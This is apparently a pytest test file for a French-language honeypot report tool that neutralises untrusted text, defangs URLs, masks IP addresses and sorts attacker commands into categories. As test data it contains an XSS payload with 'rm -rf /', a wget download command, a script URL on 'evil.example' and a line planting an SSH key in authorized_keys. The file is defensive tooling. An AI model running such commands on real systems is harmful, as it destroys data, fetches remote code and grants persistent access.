import sys

import pytest

import report


def _build(db_path, excluded=()):
    conn = report.open_db(db_path)
    report.make_view(conn, list(excluded))
    return report.build(conn, list(excluded))


def test_code_neutralizes_untrusted_text():
    out = report.code("<img src=x onerror=alert(1)> | `rm -rf /`\nligne\x1b[31m")
    assert out.startswith("`") and out.endswith("`")
    assert "\n" not in out and "|" not in out and "\x1b" not in out
    assert "\\x1b" in out


def test_defang_and_mask():
    assert report.defang("http://evil.example/a.sh") == "`hxxp://evil[.]example/a[.]sh`"
    assert report.mask_ip("203.0.113.10") == "203.0.113.x"
    assert report.mask_ip("2001:db8:1:2::5") == "2001:db8::x"


def test_categorize():
    assert report.categorize("wget http://x/a -O a") == "Téléchargement / exécution"
    assert report.categorize("echo k >> ~/.ssh/authorized_keys") == "Persistance (clés SSH, cron)"
    assert report.categorize("uname -a") == "Reconnaissance système"
    assert report.categorize("zzz") == "Autre"


def test_report_contains_sections_and_defanged_links(db_path):
    text = _build(db_path)
    for title in ("## 1. Résumé", "## 3. Identifiants testés", "## 5. Fichiers téléchargés", "## Méthodologie"):
        assert title in text
    assert "hxxp://evil[.]example/x[.]sh" in text
    assert "http://evil.example" not in text
    assert "203.0.113.10" not in text  # IP toujours masquées


def test_excluded_ip_disappears(db_path):
    text = _build(db_path, ["203.0.113.10"])
    assert "evil" not in text
    assert "203.0.113.x" not in text
    assert "198.51.100.x" in text


def test_everything_excluded(db_path):
    text = _build(db_path, ["203.0.113.10", "198.51.100.7"])
    assert "aucun événement" in text


def test_invalid_ip_is_rejected(db_path, monkeypatch):
    monkeypatch.setattr(sys, "argv", ["report.py", "--db", str(db_path), "--exclude-ip", "pas-une-ip"])
    with pytest.raises(SystemExit):
        report.main()
